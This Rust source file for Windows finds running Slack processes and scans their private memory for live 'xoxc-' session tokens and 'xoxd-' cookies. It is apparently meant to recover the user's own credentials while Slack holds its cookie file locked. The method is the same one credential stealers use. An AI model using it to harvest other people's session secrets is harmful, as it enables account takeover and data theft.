//! Read another process's memory to extract live credentials (Slack `xoxc` token
//! and `xoxd` cookie). This sidesteps the exclusively-locked cookie file and works
//! while Slack is running. Same-user process, so PROCESS_VM_READ is permitted.

use std::collections::BTreeSet;
use windows::Win32::Foundation::CloseHandle;
use windows::Win32::System::Diagnostics::Debug::ReadProcessMemory;
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
};
use windows::Win32::System::Memory::{
    VirtualQueryEx, MEMORY_BASIC_INFORMATION, MEM_COMMIT, MEM_PRIVATE, PAGE_GUARD, PAGE_READONLY,
    PAGE_READWRITE,
};
use windows::Win32::System::Threading::{
    OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ,
};

/// PIDs of processes whose exe name starts with `prefix` (case-insensitive).
pub fn pids_by_name(prefix: &str) -> Vec<u32> {
    let mut pids = Vec::new();
    let prefix = prefix.to_lowercase();
    unsafe {
        let snap = match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
            Ok(s) => s,
            Err(_) => return pids,
        };
        let mut entry = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };
        if Process32FirstW(snap, &mut entry).is_ok() {
            loop {
                let name = String::from_utf16_lossy(&entry.szExeFile);
                let name = name.trim_end_matches('\0').to_lowercase();
                if name.starts_with(&prefix) {
                    pids.push(entry.th32ProcessID);
                }
                if Process32NextW(snap, &mut entry).is_err() {
                    break;
                }
            }
        }
        let _ = CloseHandle(snap);
    }
    pids
}

fn capture(buf: &[u8], prefix: &[u8], out: &mut BTreeSet<String>) {
    let n = buf.len();
    let mut i = 0usize;
    while i + prefix.len() < n {
        if &buf[i..i + prefix.len()] == prefix {
            let mut j = i;
            while j < n {
                let c = buf[j];
                let ok = c.is_ascii_alphanumeric()
                    || matches!(c, b'-' | b'_' | b'+' | b'/' | b'=' | b'%');
                if !ok {
                    break;
                }
                j += 1;
            }
            if j - i >= 40 {
                if let Ok(s) = std::str::from_utf8(&buf[i..j]) {
                    out.insert(s.to_string());
                }
            }
            i = j.max(i + 1);
        } else {
            i += 1;
        }
    }
}

/// Scan a process's committed private memory for `xoxc-`/`xoxd-` strings.
/// Returns (tokens, cookies). `budget` caps total bytes scanned.
pub fn scan_creds(pid: u32, budget: usize) -> (BTreeSet<String>, BTreeSet<String>) {
    let mut xoxc = BTreeSet::new();
    let mut xoxd = BTreeSet::new();
    unsafe {
        let h = match OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid) {
            Ok(h) => h,
            Err(_) => return (xoxc, xoxd),
        };
        let mut addr: usize = 0;
        let mut scanned: usize = 0;
        let max: usize = 0x7FFF_FFFF_FFFF;
        while addr < max && scanned < budget {
            let mut mbi = MEMORY_BASIC_INFORMATION::default();
            let got = VirtualQueryEx(
                h,
                Some(addr as *const core::ffi::c_void),
                &mut mbi,
                std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
            );
            if got == 0 {
                break;
            }
            let base = mbi.BaseAddress as usize;
            let region = mbi.RegionSize;
            let prot = mbi.Protect.0;
            let committed = mbi.State == MEM_COMMIT;
            let private = mbi.Type == MEM_PRIVATE;
            let readable = (prot & PAGE_READWRITE.0) != 0 || (prot & PAGE_READONLY.0) != 0;
            let guard = (prot & PAGE_GUARD.0) != 0;
            if committed && private && readable && !guard && region > 0 {
                let mut off = 0usize;
                while off < region && scanned < budget {
                    let chunk = std::cmp::min(4 * 1024 * 1024, region - off);
                    let mut buf = vec![0u8; chunk];
                    let mut read = 0usize;
                    let ok = ReadProcessMemory(
                        h,
                        (base + off) as *const core::ffi::c_void,
                        buf.as_mut_ptr() as *mut core::ffi::c_void,
                        chunk,
                        Some(&mut read),
                    )
                    .is_ok();
                    if ok && read > 1 {
                        let slice = &buf[..read];
                        capture(slice, b"xoxc-", &mut xoxc);
                        capture(slice, b"xoxd-", &mut xoxd);
                        scanned += read;
                    }
                    off += chunk;
                }
            }
            let next = base.wrapping_add(region);
            if next <= addr {
                break;
            }
            addr = next;
        }
        let _ = CloseHandle(h);
    }
    (xoxc, xoxd)
}

/// Scan all Slack processes and return the union of (tokens, cookies).
pub fn scan_slack() -> (Vec<String>, Vec<String>) {
    let mut xoxc = BTreeSet::new();
    let mut xoxd = BTreeSet::new();
    for pid in pids_by_name("slack") {
        let (c, d) = scan_creds(pid, 250_000_000);
        xoxc.extend(c);
        xoxd.extend(d);
    }
    (xoxc.into_iter().collect(), xoxd.into_iter().collect())
}
